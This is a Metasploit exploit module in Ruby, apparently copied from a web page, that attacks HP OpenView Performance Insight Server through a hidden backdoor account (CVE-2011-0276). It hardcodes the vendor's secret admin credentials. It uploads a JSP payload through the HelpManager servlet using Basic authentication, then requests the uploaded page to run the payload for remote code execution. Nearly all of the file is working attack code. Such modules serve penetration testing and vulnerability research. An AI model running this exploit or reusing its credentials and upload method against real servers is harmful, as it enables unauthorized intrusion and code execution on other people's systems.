# $Id: hp_openview_insight_backdoor.rb 11969 2011-03-15 21:56:11Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP OpenView Performance Insight Server Backdoor Account Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a hidden account in the com.trinagy.security.XMLUserManager Java
                class. When using this account, an attacker can abuse the
                com.trinagy.servlet.HelpManagerServlet class and write arbitary files to the system
                allowing the execution of arbitary code.
 
                NOTE: This module has only been tested against HP OpenView Performance Insight Server 5.41.0
            },
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 11969 $&#039;,
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Privileged&#039;     => true,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-0276&#039; ],
                    [ &#039;OSVDB&#039;, &#039;70754&#039; ],
                ],
            &#039;Targets&#039;        =>
                [
                    [ &#039;Universal Windows Target&#039;,
                        {
                            &#039;Arch&#039;     => ARCH_JAVA,
                            &#039;Payload&#039;  =>
                                {
                                    &#039;DisableNops&#039; => true,
                                },
                        }
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jan 31 2011&#039;))
 
        register_options(
            [
                Opt::RPORT(80),
                OptString.new(&#039;USERNAME&#039;, [ false, &#039;The username to authenticate as&#039;, &#039;hch908v&#039; ]),
                OptString.new(&#039;PASSWORD&#039;, [ false, &#039;The password for the specified username&#039;, &#039;z6t0j$+i&#039; ])
            ], self.class )
 
    end
 
    def exploit
 
        creds = "#{datastore[&#039;USERNAME&#039;]}" + ":" + "#{datastore[&#039;PASSWORD&#039;]}"
 
        dir  = rand_text_alpha_upper(rand(8) + 1)
        page = rand_text_alpha_upper(8) + ".jsp"
        uid  = rand(20).to_s
 
        file =  "-----------------------------#{uid}\r\n"
        file << "Content-Disposition: form-data; name=\"filename\"; filename=\"#{page}\"\r\n"
        file << "Content-Type: application/x-java-archive\r\n\r\n"
        file << payload.encoded + "\r\n"
        file <<  "-----------------------------#{uid}\r\n"
        # if (p.getName().equals("location")); ...
        file << "Content-Disposition: form-data; name=\"location\"\r\n"
        file << "Content-Type: text/plain\r\n\r\n"
        file << dir + "\r\n"
        file << "-----------------------------#{uid}\r\n\r\n"
 
        print_status("Sending our POST request...")
 
        res = send_request_cgi(
            {
                &#039;uri&#039;       => "/reports/helpmanager",
                &#039;version&#039;   => &#039;1.1&#039;,
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;ctype&#039;         => &#039;multipart/form-data; boundary=---------------------------&#039; + uid,
                &#039;data&#039;      => file,
                &#039;headers&#039;   =>
                    {
=begin
this.internal = new User("hch908v");
this.internal.setName("hidden user");
this.internal.setEncryptedPassword(TrendCrypt.crypt("hch908v", "z6t0j$+i"));
this.internal.addRole("user");
this.internal.addRole("admin");
=end
                        &#039;Authorization&#039; =>  "Basic #{Rex::Text.encode_base64(creds)}",
 
                    }
            }, 5)
         
        if ( res and res.code == 200 )
            print_status("Login/Upload successful. Triggering payload at &#039;/help/#{dir}/#{page}&#039;...")
            send_request_raw({
                    &#039;uri&#039;       => "/help/#{dir}/#{page}",
                    &#039;method&#039;    => &#039;GET&#039;,
                    &#039;version&#039;   => &#039;1.0&#039;,
            }, 5)
 
            handler
        else
            print_error("Login/Upload refused!")
            return
        end
    end
end



